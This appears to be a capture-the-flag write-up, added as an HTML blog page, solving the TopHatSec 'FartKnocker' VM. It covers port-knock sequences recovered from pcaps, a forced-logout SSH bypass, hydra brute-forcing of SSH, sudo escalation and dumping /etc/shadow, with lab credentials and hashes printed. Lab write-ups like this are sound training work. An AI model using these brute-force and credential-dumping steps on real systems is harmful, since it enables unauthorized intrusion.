@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>TopHatSec: FartKnocker - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-04-10">April 10, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/tophatsec">tophatsec</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">TopHatSec: FartKnocker</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This VM has a focus on port knocking, the clues for which are buried in packet captures.</p>
+
+<h2 id="discovery:e5233222f13543d15163b8fc77c786fb">Discovery</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -p- -A 192.168.56.103
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+</code></pre>
+
+<h2 id="knock-once:e5233222f13543d15163b8fc77c786fb">Knock Once</h2>
+
+<p>The webpage on port 80 contains a simple HTML file, with a link to the first packet capture.</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;a href=&quot;pcap1.pcap&quot;&gt;Wooah&lt;/a&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>So let&rsquo;s download this and have a look in Wireshark.  There are 2 main sections separated by ICMP request/replies.</p>
+
+<p><div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/fartknocker/pcap1.jpg"  />
+    
+    
+</figure>
+</div>
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/fartknocker/pcap1-2.jpg"  />
+    
+    
+</figure>
+</div></p>
+
+<p>The first sequence of packets are SYN packets to ports <code>7000</code>, <code>8000</code> and <code>9000</code>.  The second sequence are more SYN packets to ports <code>7000</code>, <code>8000</code>, <code>9000</code> and <code>8888</code>.
+Knocking these ports opens ports <code>8888</code>.</p>
+
+<pre><code class="language-text">root@kali:~# knock -v 192.168.56.103 7000 8000 9000 7000 8000 9000 8888; nc 192.168.56.103 8888
+hitting tcp 192.168.56.103:7000
+hitting tcp 192.168.56.103:8000
+hitting tcp 192.168.56.103:9000
+hitting tcp 192.168.56.103:7000
+hitting tcp 192.168.56.103:8000
+hitting tcp 192.168.56.103:9000
+hitting tcp 192.168.56.103:8888
+/burgerworld/
+</code></pre>
+
+<h2 id="knock-twice:e5233222f13543d15163b8fc77c786fb">Knock Twice</h2>
+
+<pre><code class="language-text">root@kali:~# curl 192.168.56.103/burgerworld/
+</code></pre>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;a href=&quot;pcap2.pcap&quot;&gt;heheh...hehh..&lt;/a&gt;
+&lt;/html&gt;
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# wget 192.168.56.103/burgerworld/pcap2.pcap
+root@kali:~# wireshark pcap2.pcap 
+</code></pre>
+
+<p>There are quite a few more packets this time, so I made the review a bit easier by putting a source IP filter in place.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/fartknocker/pcap2.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>This time we have a SYN on port <code>21</code>, UDP packet on port <code>22</code>, SYN on <code>80</code> and a SYN on <code>8080</code>.</p>
+
+<pre><code class="language-text">root@kali:~# knock -v 192.168.56.103 21 22:udp 80 8080; nc 192.168.56.103 8080
+hitting tcp 192.168.56.103:21
+hitting udp 192.168.56.103:22
+hitting tcp 192.168.56.103:80
+hitting tcp 192.168.56.103:8080
+(UNKNOWN) [192.168.56.103] 8080 (http-alt) : Connection refused
+root@kali:~# knock -v 192.168.56.103 21 22:udp 80 8080; nc 192.168.56.103 8080
+hitting tcp 192.168.56.103:21
+hitting udp 192.168.56.103:22
+hitting tcp 192.168.56.103:80
+hitting tcp 192.168.56.103:8080
+
+                      MMMMMMM           MMMMMMH 
+                HMMMMM:::::::.MMMMMMMMMM:::::.TMM
+              MMMI:::::::::::::::::::MMH::::::::TM
+            MMIi::::::::::::.:::::::::::::::::::::MMMM
+           MT::::.::::::::::::::::::::::::::::::.::=T.IMMM
+         MMMi:::::::::::::::::::::::::::::::::::::::::::MT)MM
+     MMMI.:::::::::::::::::::::::::::::::::::::::::::.:::M= MM
+   XMXi::::::::::::::::::::::.:::::::::::::::::::::::::::::::=MM
+   MMi::::::::::::::::::::::::::::::::::::::::::::::::::.::..:=MMM
+  MM:MMT:::::::::.:::::::::::::::::.:::::::::::::::::::::::::::MiMM
+   MMM::::::::::::::::::.::::::::::::::::::::::::::.::::::::::.TM.MM
+   MMi::::::::::::::.::::::::::::::::::::::::::::::::::::::.:::.:: M
+   MM:::.::::::::::::::::::::::::::::::::.:.:::::::::::::::::::::: XM
+ MM:MT::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::XM
+IMM:::.::::::::::::::::::::::::::::::::::: :::::::::::::::::::::::.=M
+ MM::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: :::M
+ XMT:::::::::::::::::::::: ::::::::::::::::: : ::::::::::::::::::: iM
+   MiMi:::::::::: :::::::::::::::::::::::::::::::: ::::::::::::::.:IM
+     M::::::HH::::::::::::::::::::::::::::::::::::::::::::::::::::: M
+     MT:::::iM::::::::Hi:iXH:::ii::XH:::::::::::::.::::::::::::::.:.M
+      MX:::::iMX:i::::iMi:iMH::XH::Mi:::::::::::::::::::::::::::::: M
+        Mii::::HMH:::::iMH::MH=:MM=TMi::::::::::::::::::::::::::::::MM
+          MMMMMMMMMMMXTi:MMHi:HMMIMMMMii::::::::::::::::::::::::::::XM
+           XXOXMMT:. ::T= :IMMMMMMM=iXMii:::::::::::::::::::::::::: MM
+            MMMH:::.:::::::.::::.::::.:XMi::::::::::::::::::::::::::MM
+           XMM::.:.:..::..:.:.::.:.::: ::XMi::::::::::::::::::::::::MX
+          XMMT::::.:.::.::::.::.::::::::.::XH:::::::::::::::::::::: M
+          HMX::...:..::..:.:.::::::..... :::XX::::::::::::::.:::::. M
+          MM:::....:::::.::::::..:::::.:..:::HX::::::::::::::::::::=M
+          MX::::::::::::::::::::::..::::.:..::X::::::::::::::::::::IM
+         XMI..  .:.::....:..::::.:: ::...::.:.MH:::::::::::::::::.: M
+         MM:. ::..::....::.::::::....:.:...:..MT::.   ::::::::: :..IM
+         MM=:::::.::.:::::..::::.: .::..::..::Mi:::::::::::::::::: MM
+         MMI:::...:  .::..::::::.:::::::.::::TM:::::::::::::::::::=MO
+          MH.: .::::.::.. .:::::iLMXX=::::.:.Mi::::::: ::::::::::.MM
+          MX:.:..:: .:.:.:.: :MMM:::..:::::.HM:::: :::::::::::::.MM
+          MM:::...::....: ::IMT:::.:...:.::.MT::::::: ::::::::: MM
+           M=::..::::..:::MM:i:..::.:...: ::M:::: ::: ::::::::::MI
+           MH::: :.:.: MMMM=:::.:.:...:....iM::: ::::::  ::::::LM
+          MMMMT.::. ::TM:::::..::::::::.::.IM::::HH:::::::::::.MO
+           MM:LM::T:MT.:: .......:....:.:: TMMiXMT.MH:::.::::.:M=
+            M:. :::MMi:::MMMM=::::::.::..::=MMMMMMXMH:::.:::::MM
+           XMI: :..::=MX  :M::.......:...:::.MXTHM MH:::.: :.XM
+           MM XMMI IM    M   ................:: :MIIM:::::::MMO
+            MMXXMILM  .ML.= :.:::....:.:..::.:..:::MMT:::::TMM
+              MXMLMMMT::.:...:........ ....::.:.=.MMMM:::::MM
+              MHM=:: :.:::...::::.:...:.....:: =MMM==Mi::::M
+              MM=:::.......:.:.::.:.::...:.: ::  . ::=M:: MM
+             MMi:=XMMMi::::...:::::.::.:::::::::..: ::Mi:=MT
+            MM=:I::  :iMH==:::::.::.:::::::::::::::.::MT:XMT
+           MT=:=MMMMMMM=HM::::.::::::MMT=Mi::::::..:::MI=MM
+          M ::::::.=I= .MX:..: ::::.::MX::::.:::.:.  .XMMM
+         M:MMMMMMM=.::::  ::.::...:.MMIM::.:::.::..::::M
+                 M=:: : ::::.==XMMM:XMMM=:::.::.:.::::.M
+                 M=.IMMM )X   M  MMMMMM=:::..::..:::.::M
+                 MM  X  MMM:MMMMMMMMM=:::.:.:.. .:.::::M
+                  MIMMMMMMMMMMMMMMI::::::::.:::.:...:.:M
+                MMMMMMMMMMMMMX:.   .:..::....:...:::.:iM
+               MMMMMMMMMMI::::::.:.::...:....:.....:.:=M
+           MMMMMMMMMI:::::.:.. :.::.::..........:..:..:M
+            M=:  :..::..::.........::.......::.:.....: M
+             MMMi::::::.:.:==MMMMMMMMMT:.:.:::..:::..: OM
+               MM=::..: OMMMM         MMMT:::....:.::: :M
+                M=::::MM                MMI:::........:OM
+                 MMMMM                   MMH:::..::MMMMMM
+                                          MMMMMMMMMMMMMMM
+
+
+                     CAN YOU UNDERSTAND MY MESSAGE?!
+
+
+
+        eins drei drei sieben
+</code></pre>
+
+<h2 id="knock-thrice:e5233222f13543d15163b8fc77c786fb">Knock Thrice</h2>
+
+<p><code>eins drei drei sieben</code> is German for <code>one three three seven</code>&hellip; <code>1337</code>, get it ;)</p>
+
+<pre><code class="language-text">root@kali:~# knock -v 192.168.56.103 1 3 3 7; nc 192.168.56.103 1337
+hitting tcp 192.168.56.103:1
+hitting tcp 192.168.56.103:3
+hitting tcp 192.168.56.103:3
+hitting tcp 192.168.56.103:7
+(UNKNOWN) [192.168.56.103] 1337 (?) : Connection refused
+root@kali:~# knock -v 192.168.56.103 1 3 3 7; nc 192.168.56.103 1337
+hitting tcp 192.168.56.103:1
+hitting tcp 192.168.56.103:3
+hitting tcp 192.168.56.103:3
+hitting tcp 192.168.56.103:7
+/iamcornholio/
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# curl 192.168.56.103/iamcornholio/
+</code></pre>
+
+<pre><code class="language-html">&lt;html&gt;
+T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK
+&lt;/html&gt;
+</code></pre>
+
+<p>This is a <code>base64</code> encoded string.</p>
+
+<pre><code class="language-text">root@kali:~# echo -en &quot;T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK&quot; | base64 -d
+Open up SSH: 8888 9999 7777 6666
+</code></pre>
+
+<h2 id="knock-four-ice:e5233222f13543d15163b8fc77c786fb">Knock Four-ice?</h2>
+
+<pre><code class="language-text">root@kali:~# knock -v 192.168.56.103 8888 9999 7777 6666; ssh 192.168.56.103
+hitting tcp 192.168.56.103:8888
+hitting tcp 192.168.56.103:9999
+hitting tcp 192.168.56.103:7777
+hitting tcp 192.168.56.103:6666
+ssh: connect to host 192.168.56.103 port 22: Connection refused
+root@kali:~# knock -v 192.168.56.103 8888 9999 7777 6666; ssh 192.168.56.103
+hitting tcp 192.168.56.103:8888
+hitting tcp 192.168.56.103:9999
+hitting tcp 192.168.56.103:7777
+hitting tcp 192.168.56.103:6666
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+root@192.168.56.103's password: 
+</code></pre>
+
+<h2 id="ssh:e5233222f13543d15163b8fc77c786fb">SSH</h2>
+
+<p>It was very nice of it to give us the credentials for <code>butthead</code>, but we get kicked off straight away.</p>
+
+<pre><code class="language-text">root@kali:~# ssh butthead@192.168.56.103
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+butthead@192.168.56.103's password: 
+Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+Last login: Wed Apr  8 16:30:47 2015 from 192.168.56.101
+You are only logging in for a split second! What do you do!
+Connection to 192.168.56.103 closed.
+</code></pre>
+
+<p>We can get around this by simply placing a shell command to run at the end of the line, e.g:</p>
+
+<pre><code class="language-text">root@kali:~# ssh butthead@192.168.56.103 id
+butthead@192.168.56.103's password: 
+uid=1001(butthead) gid=1001(butthead) groups=1001(butthead)
+</code></pre>
+
+<p>Of course, invoking <code>/bin/bash</code> saves a lot of tediousness.</p>
+
+<pre><code class="language-text">root@kali:~# ssh butthead@192.168.56.103 /bin/bash
+butthead@192.168.56.103's password: 
+
+id
+uid=1001(butthead) gid=1001(butthead) groups=1001(butthead)
+whoami
+butthead
+
+ls -l
+total 4
+-rw-rw-r-- 1 butthead butthead 67 Mar  3 00:33 nachos
+
+cat nachos
+Great job on getting this far.
+
+Can you login as beavis or root ?
+</code></pre>
+
+<h2 id="getting-beavis:e5233222f13543d15163b8fc77c786fb">Getting Beavis!</h2>
+
+<p>This portion of the VM took me something like 6 hours!  Getting beavis&rsquo; password was a complete pain &gt;:D</p>
+
+<p>I figured that the password would be Beavis and Butthead related.  So I used cEWL to pull words from various sources such as Wikipedia and IMDB quote pages.  I ran the wordlist through <code>hydra</code> but no valid login was found :(</p>
+
+<p>The final trick was to a) remove all spaces; b) convert all characters to lowercase.</p>
+
+<p>Eventually&hellip;</p>
+
+<pre><code class="language-text">root@kali:~# hydra -l beavis -P wordlist -f -t 32 192.168.56.103 ssh
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[22][ssh] host: 192.168.56.103   login: beavis   password: mikejudge
+[STATUS] attack finished for 192.168.56.103 (valid pair found)
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# ssh beavis@192.168.56.103
+
+beavis@Huhuhhhhhuhuhhh:~$ id; whoami
+uid=1000(beavis) gid=1000(beavis) groups=1000(beavis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
+beavis
+</code></pre>
+
+<h2 id="root:e5233222f13543d15163b8fc77c786fb">Root</h2>
+
+<p>Beavis is a member of the <code>sudo</code> group, making the escalation a trivial exercise.</p>
+
+<pre><code class="language-text">beavis@Huhuhhhhhuhuhhh:~$ sudo -l
+[sudo] password for beavis: 
+Matching Defaults entries for beavis on Huhuhhhhhuhuhhh:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User beavis may run the following commands on Huhuhhhhhuhuhhh:
+    (ALL : ALL) ALL
+beavis@Huhuhhhhhuhuhhh:~$ sudo -i
+
+root@Huhuhhhhhuhuhhh:~# cat /etc/shadow
+root:$6$iKFfVKIm$TChaO1huLt0YVVUKdQ./4/nPKa7hL96JRDUk0qzBt0Hl9MeYCzZD5cS9qaxxbzif78mX8XiO2seiukv0vPL48/:16497:0:99999:7:::
+beavis:$6$vL7Sn7xS$vmqKbPx1nahNiF8YmITZqgXhv89G/aMQSMJOfN5meoOQtcsIAxrlTyC/pUHwoDkWkkq2Umr7HawkiLrnYFqI11:16496:0:99999:7:::
+butthead:$6$wl1mxaMt$ginoPx9IAhi6WnJzrhH0bUDDhQVhLPWOvYAaT9Tf2hgauBiOxbNNY8WZMSSg1n0XEkvSoGKvV8EtibKg0AP1Y.:16497:0:99999:7::
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
